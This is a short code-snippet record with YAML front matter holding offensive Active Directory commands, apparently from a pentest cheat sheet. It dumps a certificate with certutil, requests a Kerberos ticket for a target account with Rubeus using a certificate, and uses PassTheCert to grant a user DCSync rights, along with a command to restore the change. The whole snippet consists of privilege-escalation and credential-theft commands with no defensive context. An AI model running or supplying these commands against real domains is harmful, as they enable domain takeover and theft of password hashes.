---
id: 9e8e9b32-0965-4079-b18b-f61924bf41c7
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:06.176355+00:00'
updated_at: '2023-04-10T20:26:17.413716+00:00'
---

# Code Snippet 9e8e9b32

**Language**: ps1

```ps1
# Information about a cert file
certutil -v -dump admin.pfx

# From a Base64 PFX
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show

# Grant DCSync rights to an user
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>
# To restore
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
```


